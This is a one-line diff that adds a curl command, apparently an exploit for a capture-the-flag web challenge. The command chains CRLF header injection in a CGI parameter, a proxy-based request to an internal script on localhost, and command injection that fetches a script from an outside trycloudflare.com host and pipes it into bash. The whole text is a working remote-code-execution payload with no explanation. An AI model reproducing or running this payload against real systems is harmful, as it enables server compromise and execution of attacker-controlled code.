@@ -1,0 +1,1 @@
+ curl 'http://94.237.61.48:30144/cgi-bin/attack-domain?target=-&name=a%0d%0aLocation:+/a%0d%0aContent-Type:+proxy:http://127.0.0.1/cgi-bin/attack-ip%3ftarget=::1%$(curl%2bearl-rick-climate-daisy.trycloudflare.com|bash)%26name=%0d%0a%0d%0a'
